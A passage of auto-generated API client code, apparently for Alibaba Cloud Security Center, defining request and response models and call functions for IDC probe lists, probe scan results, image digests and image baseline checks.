  requestId?: string(name='RequestId', description='The ID of this call request, which is a unique identifier generated by Alibaba Cloud for the request and can be used for troubleshooting and problem localization.', example='0C8487EF-50C2-54BB-8634-10F8C35D****'),
}

model DescribeIdcProbeListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeIdcProbeListResponseBody(name='body'),
}

/**
 * @summary Query IDC probe list
 *
 * @param request DescribeIdcProbeListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeIdcProbeListResponse
 */
async function describeIdcProbeListWithOptions(request: DescribeIdcProbeListRequest, runtime: Util.RuntimeOptions): DescribeIdcProbeListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.idcName)) {
    query['IdcName'] = request.idcName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeIdcProbeList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query IDC probe list
 *
 * @param request DescribeIdcProbeListRequest
 * @return DescribeIdcProbeListResponse
 */
async function describeIdcProbeList(request: DescribeIdcProbeListRequest): DescribeIdcProbeListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeIdcProbeListWithOptions(request, runtime);
}

model DescribeIdcProbeScanResultListRequest {
  criteria?: string(name='Criteria', description='The search conditions for assets. This parameter is in the JSON format. The value is case-sensitive.

>  A search condition can be the instance ID, instance name, VPC ID, region, or public IP address. You can call the [DescribeIdcAssetCriteria](https://help.aliyun.com/document_detail/2842671.html) operation to query supported search conditions.', example='[{\\\\"name\\\\":\\\\"scannedIp\\\\",\\\\"value\\\\":\\\\"192.168.2.11\\\\"}]'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  foundEndTime?: long(name='FoundEndTime', description='The end time of the scan.', example='1720006819000'),
  foundStartTime?: long(name='FoundStartTime', description='The start time of the scan.', example='1720006818000'),
  logicalExp?: string(name='LogicalExp', description='The logical operator that combines multiple search conditions. Valid values:

*   **OR******
*   **AND******', example='OR'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  status?: string(name='Status', description='The statuses of the corresponding probes. Separate multiple values with commas (,). Valid values:

*   **0**: The probe is valid.
*   **1**: The probe is ignored.
*   **2**: The probe is invalid.
*   **3**: The probe expired.
*   **4**: The probe does not exist.', example='0,1'),
}

model DescribeIdcProbeScanResultListResponseBody = {
  instances?: [ 
    {
      clientStatus?: string(name='ClientStatus', description='The status of the client of the instance on which the probe is installed. Valid values:

*   **online**: The Security Center agent on the asset is **enabled**.
*   **offline**: The Security Center agent on the asset is **disabled**.', example='online'),
      idcName?: string(name='IdcName', description='The name of the IDC.', example='Test'),
      ipSegment?: string(name='IpSegment', description='The CIDR blocks.', example='192.168.2.0/24'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1720006818000'),
      os?: string(name='Os', description='The operating system type of the asset. Valid values:

*   **windows**
*   **linux**', example='Linux'),
      probeInternetIp?: string(name='ProbeInternetIp', description='The private IP address of the associated instance.', example='42.121.*.*'),
      probeIntranetIp?: string(name='ProbeIntranetIp', description='The private IP address of the associated instance.', example='192.168.*.*'),
      probeMachineName?: string(name='ProbeMachineName', description='The name of the associated instance.', example='i-xxxx'),
      probeUuid?: string(name='ProbeUuid', description='The UUID of the associated instance.', example='11C96623-E106-59C9-866D-A6C82911****'),
      scanResultId?: long(name='ScanResultId', description='The ID of the scan result.', example='1231'),
      scannedIp?: string(name='ScannedIp', description='The IP address that is scanned.', example='192.168.*.*'),
      validPort?: string(name='ValidPort', description='The port that is scanned.', example='22'),
    }
  ](name='Instances', description='The instances.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='A3D7C47D-3F11-57BB-90E8-E5C20C61****'),
}

model DescribeIdcProbeScanResultListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeIdcProbeScanResultListResponseBody(name='body'),
}

/**
 * @summary Queries assets that are identified by Internet Data Center (IDC) probes.
 *
 * @param request DescribeIdcProbeScanResultListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeIdcProbeScanResultListResponse
 */
async function describeIdcProbeScanResultListWithOptions(request: DescribeIdcProbeScanResultListRequest, runtime: Util.RuntimeOptions): DescribeIdcProbeScanResultListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.foundEndTime)) {
    query['FoundEndTime'] = request.foundEndTime;
  }
  if (!Util.isUnset(request.foundStartTime)) {
    query['FoundStartTime'] = request.foundStartTime;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeIdcProbeScanResultList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries assets that are identified by Internet Data Center (IDC) probes.
 *
 * @param request DescribeIdcProbeScanResultListRequest
 * @return DescribeIdcProbeScanResultListResponse
 */
async function describeIdcProbeScanResultList(request: DescribeIdcProbeScanResultListRequest): DescribeIdcProbeScanResultListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeIdcProbeScanResultListWithOptions(request, runtime);
}

model DescribeImageRequest {
  imageInstanceId?: string(name='ImageInstanceId', description='The instance ID of the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of instances.

This parameter is required.', example='cri-hfs6gaawhyu6****'),
  imageRegionId?: string(name='ImageRegionId', description='The region ID of the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of regions.

This parameter is required.', example='cn-hangzhou'),
  imageRepoId?: string(name='ImageRepoId', description='The ID of the image repository.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of image repositories.

This parameter is required.', example='crr-7i88t7lx3fmf****'),
  imageTag?: string(name='ImageTag', description='The tag that is added to the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query tags.

This parameter is required.', example='1.8.0.15'),
}

model DescribeImageResponseBody = {
  data?: {
    digest?: string(name='Digest', description='The digest value of the image.', example='0afb98d97f1a4030782fcf47e186909e5ad957bcc182d8be70334e0684b2****'),
  }(name='Data', description='The information about the image digest.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeImageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageResponseBody(name='body'),
}

/**
 * @summary Queries an image digest.
 *
 * @param request DescribeImageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageResponse
 */
async function describeImageWithOptions(request: DescribeImageRequest, runtime: Util.RuntimeOptions): DescribeImageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.imageInstanceId)) {
    query['ImageInstanceId'] = request.imageInstanceId;
  }
  if (!Util.isUnset(request.imageRegionId)) {
    query['ImageRegionId'] = request.imageRegionId;
  }
  if (!Util.isUnset(request.imageRepoId)) {
    query['ImageRepoId'] = request.imageRepoId;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries an image digest.
 *
 * @param request DescribeImageRequest
 * @return DescribeImageResponse
 */
async function describeImage(request: DescribeImageRequest): DescribeImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageWithOptions(request, runtime);
}

model DescribeImageBaselineCheckResultRequest {
  criteria?: string(name='Criteria', description='The search condition for the image baseline.', example='ak_leak'),
  criteriaType?: string(name='CriteriaType', description='The type of the search condition. Valid values:

*   **BaselineNameAlias**: baseline name
*   **BaselineClassAlias**: baseline category', example='BaselineNameAlias'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.

This parameter is required.', example='a910053dd4710173ecc9e9d8931f****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The severity of the image baseline that you want to query. Separate multiple severities with commas (,). By default, all valid values are used. Valid values:

*   **high**
*   **medium**
*   **low**', example='high,medium,low'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
}

model DescribeImageBaselineCheckResultResponseBody = {
  baselineResult?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias', description='The key of the image baseline type.', example='identification'),
      baselineItemCount?: int32(name='BaselineItemCount', description='The number of baseline check items.', example='5'),
      baselineNameAlias?: string(name='BaselineNameAlias', description='The alias of the image baseline.', example='Identity authentication'),
      baselineNameKey?: string(name='BaselineNameKey', description='The key of the image baseline.', example='identification'),
      baselineNameLevel?: string(name='BaselineNameLevel', description='The severity of the image baseline. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1610304058366'),
      highRiskItemCount?: int32(name='HighRiskItemCount', description='The number of high-risk images that are affected.', example='1'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='1610304058301'),
      lowRiskItemCount?: int32(name='LowRiskItemCount', description='The number of low-risk images that are affected.', example='10'),
      middleRiskItemCount?: int32(name='MiddleRiskItemCount', description='The number of medium-risk images that are affected.', example='1'),
      status?: int32(name='Status', description='The status of the baseline risks. Valid values:

*   **0**: unfixed
*   **1**: fixed', example='1'),
    }
  ](name='BaselineResult', description='An array that consists of the check results of image baselines.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeImageBaselineCheckResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageBaselineCheckResultResponseBody(name='body'),
}

/**
 * @summary Queries the security scan results of images.
 *
 * @param request DescribeImageBaselineCheckResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageBaselineCheckResultResponse
 */
async function describeImageBaselineCheckResultWithOptions(request: DescribeImageBaselineCheckResultRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the security scan results of images.
 *
 * @param request DescribeImageBaselineCheckResultRequest
 * @return DescribeImageBaselineCheckResultResponse
 */
async function describeImageBaselineCheckResult(request: DescribeImageBaselineCheckResultRequest): DescribeImageBaselineCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineCheckResultWithOptions(request, runtime);
}

model DescribeImageBaselineCheckSummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the specified container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the ID of the container cluster.', example='c60b77fe62093480db6164a3c2fa5****'),
  criteria?: string(name='Criteria', description='The search condition for the image baseline.', example='Unauthorized access'),
  criteriaType?: string(name='CriteriaType', description='The type of the search condition. Valid values:

*   **BaselineNameAlias**: baseline name
*   **BaselineClassAlias**: baseline category', example='BaselineNameAlias'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The severity of the image baseline that you want to query. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
}

model DescribeImageBaselineCheckSummaryResponseBody = {
  baselineResultSummary?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias', description='The category of the baseline.', example='Unauthorized access'),
      baselineClassKey?: string(name='BaselineClassKey', description='The keyword of the baseline category.', example='hc_image_exploit'),
      baselineNameAlias?: string(name='BaselineNameAlias', description='The name of the baseline.', example='Unauthorized access'),
      baselineNameKey?: string(name='BaselineNameKey', description='The keyword of the baseline name.', example='hc_image_exploit'),
      baselineNameLevel?: string(name='BaselineNameLevel', description='The severity of the image baseline. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1626628760000'),
      highRiskImage?: int32(name='HighRiskImage', description='The number of images on which **high** baseline risks are detected.', example='15'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp generated when the last scan was performed. Unit: milliseconds.', example='1626628760000'),
      lowRiskImage?: int32(name='LowRiskImage', description='The number of images on which **low** baseline risks are detected.', example='0'),
      middleRiskImage?: int32(name='MiddleRiskImage', description='The number of images on which **medium** baseline risks are detected.', example='0'),
      status?: int32(name='Status', description='The status of the baseline risks. Valid values:

*   **0**: unfixed
*   **1**: fixed
*   **2**: pending verification
*   **3**: fixing failed', example='0'),
    }
  ](name='BaselineResultSummary', description='An array that consists of the check results of image baselines.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='3'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5BD95679-D63A-4151-97D0-188432F4A57'),
}

model DescribeImageBaselineCheckSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageBaselineCheckSummaryResponseBody(name='body'),
}

/**
 * @summary Queries the check results of image baselines that are included in an image scan task.
 *
 * @param request DescribeImageBaselineCheckSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageBaselineCheckSummaryResponse
 */
async function describeImageBaselineCheckSummaryWithOptions(request: DescribeImageBaselineCheckSummaryRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the check results of image baselines that are included in an image scan task.
 *
 * @param request DescribeImageBaselineCheckSummaryRequest
 * @return DescribeImageBaselineCheckSummaryResponse
 */
async function describeImageBaselineCheckSummary(request: DescribeImageBaselineCheckSummaryRequest): DescribeImageBaselineCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineCheckSummaryWithOptions(request, runtime);
}

model DescribeImageBaselineDetailRequest {
  baselineItemKey?: string(name='BaselineItemKey', description='The information about the baseline.', example='Valid values include but are not limited to ak_leak, duplicate_uid, duplicate_pwd_hash, and non_pwd_user.'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='06293273b67d19516cfcc712194f****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeImageBaselineDetailResponseBody = {
  baselineDetail?: {
    advice?: string(name='Advice', description='The suggestion for the management of the risk item.', example='Delete the leaked AccessKey pairs.'),
    baselineClassAlias?: string(name='BaselineClassAlias', description='The alias of the baseline type.', example='ak_leak'),
    baselineItemAlias?: string(name='BaselineItemAlias', description='The alias of the baseline check item.', example='AccessKey pair leak'),
    baselineItemKey?: string(name='BaselineItemKey', description='The key of the baseline check item.', example='ak_leak'),
    baselineNameAlias?: string(name='BaselineNameAlias', description='The alias of the baseline.', example='AccessKey pair leak'),
    description?: string(name='Description', description='The description of the risk item.', example='If an AccessKey pair is leaked, the AccessKey pair may be fraudulently used.'),
    level?: string(name='Level', description='The risk level of the baseline check item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
    prompt?: string(name='Prompt', description='The issue that is detected by using the baseline.', example='/usr/aksk.txt:LTAI4GBEG5zaqX**********'),
    resultId?: string(name='ResultId', description='The ID of the asynchronous request.', example='async__c6f3b0b54613383b40bdce593ffe****'),
  }(name='BaselineDetail', description='The details about the image baseline.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeImageBaselineDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageBaselineDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details about the baseline check result for an image.
 *
 * @param request DescribeImageBaselineDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageBaselineDetailResponse
 */
async function describeImageBaselineDetailWithOptions(request: DescribeImageBaselineDetailRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemKey)) {
    query['BaselineItemKey'] = request.baselineItemKey;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about the baseline check result for an image.
 *
 * @param request DescribeImageBaselineDetailRequest
 * @return DescribeImageBaselineDetailResponse
 */
async function describeImageBaselineDetail(request: DescribeImageBaselineDetailRequest): DescribeImageBaselineDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineDetailWithOptions(request, runtime);
}

model DescribeImageBaselineItemListRequest {
  baselineClassKey?: string(name='BaselineClassKey', description='The key of the baseline type.', example='ak_leak'),
  baselineNameKey?: string(name='BaselineNameKey', description='The key of the baseline name.', example='AccessKey pair leak'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.

This parameter is required.', example='0b5c7193300da2070220038718ad****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that are scanned.'),
  status?: string(name='Status', description='The status of the baseline risk item. Valid values:

*   **0**: unfixed
*   **1**: fixed
*   **2**: pending verification
*   **3**: fixing failed', example='0'),
  uuids?: [ string ](name='Uuids', description='The UUIDs of images.'),
}

model DescribeImageBaselineItemListResponseBody = {
  baselineItemInfos?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias', description='The alias of the baseline type.', example='AccessKey pair leak'),
      baselineClassKey?: string(name='BaselineClassKey', description='The key of the baseline type.', example='ak_leak'),
      baselineItemAlias?: string(name='BaselineItemAlias', description='The alias of the baseline check item.', example='AccessKey pair leak'),
      baselineItemKey?: string(name='BaselineItemKey', description='The key of the baseline check item.', example='ak_leak'),
      baselineNameAlias?: string(name='BaselineNameAlias', description='The alias of the baseline.', example='AccessKey pair leak'),
      baselineNameKey?: string(name='BaselineNameKey', description='The key of the baseline name.', example='ak_leak'),
      status?: int32(name='Status', description='The status of the baseline risks. Valid values:

*   **0**: unfixed
*   **1**: fixed
*   **2**: pending verification
*   **3**: fixing failed', example='0'),
      whiteList?: int32(name='WhiteList', description='Indicates whether the baseline check item is added to the whitelist. Valid values:

*   **0**: The baseline check item is not added to the whitelist.
*   **1**: The baseline check item is added to the whitelist.', example='0'),
    }
  ](name='BaselineItemInfos', description='An array that consists of baseline check items.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='253'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeImageBaselineItemListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageBaselineItemListResponseBody(name='body'),
}

/**
 * @summary Queries baseline check results based on images.
 *
 * @param request DescribeImageBaselineItemListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageBaselineItemListResponse
 */
async function describeImageBaselineItemListWithOptions(request: DescribeImageBaselineItemListRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineItemListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineClassKey)) {
    query['BaselineClassKey'] = request.baselineClassKey;
  }
  if (!Util.isUnset(request.baselineNameKey)) {
    query['BaselineNameKey'] = request.baselineNameKey;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineItemList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries baseline check results based on images.
 *
 * @param request DescribeImageBaselineItemListRequest
 * @return DescribeImageBaselineItemListResponse
 */
async function describeImageBaselineItemList(request: DescribeImageBaselineItemListRequest): DescribeImageBaselineItemListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineItemListWithOptions(request, runtime);
}

model DescribeImageBaselineStrategyRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  source?: string(name='Source', description='The data source. Default value: default. Valid values:

*   **default**: queries the information about a baseline check policy for images.
*   **agentless**: queries the information about a baseline check policy for agentless detection.', example='agentless'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='8037'),
}

model DescribeImageBaselineStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='9F85AC10-A1FE-54D7-935A-F28D5256****'),
  strategy?: {
    baselineItem?: string(name='BaselineItem', description='The baseline check policy for agentless detection.', example='hc_win2008_cis_rules'),
    baselineItemList?: [ 
      {
        classKey?: string(name='ClassKey', description='The key of the baseline type.', example='identification'),
        itemKey?: string(name='ItemKey', description='The key of the baseline check item.', example='duplicate_pwd_hash'),
        nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
      }
    ](name='BaselineItemList', description='An array that contains the baselines.'),
    selectedItemCount?: int32(name='SelectedItemCount', description='The number of selected baseline check items.', example='10'),
    strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='8257'),
    strategyName?: string(name='StrategyName', description='The name of the baseline check policy.', example='default'),
    totalItemCount?: int32(name='TotalItemCount', description='The total number of baseline check items.', example='100'),
    type?: string(name='Type', description='The type of the baseline check policy. Valid values:

*   **default**: the default policy
*   **full**: a policy that uses all baselines
*   **normal**: a policy that uses general baselines', example='default'),
  }(name='Strategy', description='The information about the baseline check policy.'),
}

model DescribeImageBaselineStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageBaselineStrategyResponseBody(name='body'),
}

/**
 * @summary Queries the information about a baseline check policy for images.
 *
 * @param request DescribeImageBaselineStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageBaselineStrategyResponse
 */
async function describeImageBaselineStrategyWithOptions(request: DescribeImageBaselineStrategyRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineStrategyResponse {
  Util.validateModel(request);
  var query = {};
